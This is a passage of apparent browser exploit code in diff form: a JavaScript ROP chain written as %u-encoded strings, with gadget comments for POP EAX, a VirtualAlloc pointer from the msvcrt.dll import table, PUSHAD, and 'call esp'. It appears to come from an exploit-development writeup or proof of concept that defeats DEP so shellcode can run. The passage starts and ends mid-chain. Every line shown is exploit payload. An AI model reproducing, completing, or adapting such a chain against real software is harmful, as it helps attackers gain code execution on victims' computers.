+    "%uf5d4%u76ff" + // 0x76fff5d4 : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u11bc%u76fc" + // 0x76fc11bc : ,# ptr to &VirtualAlloc() [IAT msvcrt.dll] ** REBASED ** ASLR
+    "" + // #[---INFO:pushad:---] : 
+    "%u5cfc%u7702" + // 0x77025cfc : ,# PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "" + // #[---INFO:extras:---] : 
+    "%u30ad%u76ff" + // 0x76ff30ad : ,# ptr to 'call esp' [msvcrt.dll] ** REBASED ** ASLR
+    ""); //  : 
+
+
+--------------------------------------------------------------------------------------------------
+
